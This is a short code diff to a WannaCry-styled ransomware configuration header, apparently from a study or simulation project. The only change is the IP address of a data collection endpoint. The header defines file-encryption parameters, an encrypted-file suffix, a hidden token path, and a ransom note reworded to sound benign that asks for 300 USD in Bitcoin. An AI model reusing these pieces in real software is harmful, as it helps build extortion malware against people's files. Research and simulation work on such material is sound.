@@ -7,7 +7,7 @@ _WANNACRY_CONFIG_H = """#ifndef STUDY_CONFIG_H
 #define GCM_NONCE_LEN 12
 #define GCM_TAG_LEN 16
 #define ENCRYPTED_SUFFIX ".PROCESSED"
-#define MANAGEMENT_ENDPOINT "http://10.150.3.87:8080/collect"
+#define MANAGEMENT_ENDPOINT "http://10.254.17.95:8080/collect"
 #define SESSION_TOKEN_PATH "/tmp/.session.token"
 #define NOTICE_FILENAME "#_STATUS_NOTICE_#.txt"
 #define NOTICE_TEXT "Operational notice: contact the service owner through the approved secure channel. Reference payment: 300 USD to 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa."
